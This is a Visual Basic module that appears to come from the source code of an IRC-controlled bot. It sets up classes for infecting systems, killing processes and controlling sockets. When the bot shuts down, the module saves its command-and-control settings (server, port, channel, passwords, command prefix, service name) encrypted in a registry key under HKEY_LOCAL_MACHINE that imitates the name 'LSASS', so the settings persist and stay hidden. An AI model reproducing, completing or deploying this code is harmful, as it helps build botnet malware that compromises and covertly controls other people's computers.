Attribute VB_Name = "modLoadClass"
Option Explicit

Global KillProcess As clsKillProcess
Global System As CSysInfo
Global Bot As clsBotSettings
Global Infect As clsInfect
Global NetInfo As clsNetInfo
Global Sockets As clsSocketControl

Public Sub InitClasses()
    Set KillProcess = New clsKillProcess
    Set System = New CSysInfo
    Set Bot = New clsBotSettings
    Set Infect = New clsInfect
    Set NetInfo = New clsNetInfo
    Set Sockets = New clsSocketControl
End Sub

Public Sub KillClasses()
    Call System.SaveSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\LSASS", Crypt("Pass"), Crypt(Bot.Pass))
    Call System.SaveSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\LSASS", Crypt("Channel"), Crypt(Bot.Channel))
    Call System.SaveSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\LSASS", Crypt("Server"), Crypt(Bot.Server))
    Call System.SaveSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\LSASS", Crypt("Port"), Crypt(CStr(Bot.Port)))
    Call System.SaveSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\LSASS", Crypt("Prefix"), Crypt(Bot.Prefix))
    Call System.SaveSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\LSASS", Crypt("Service Name"), Crypt(Bot.ServiceName))
    Call System.SaveSetting(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\LSASS", Crypt("Channel Pass"), Crypt(Bot.ChanPass))
    Set KillProcess = Nothing
    Set Bot = Nothing
    Set System = Nothing
    Set Infect = Nothing
    Set NetInfo = Nothing
    Set Sockets = Nothing
End Sub
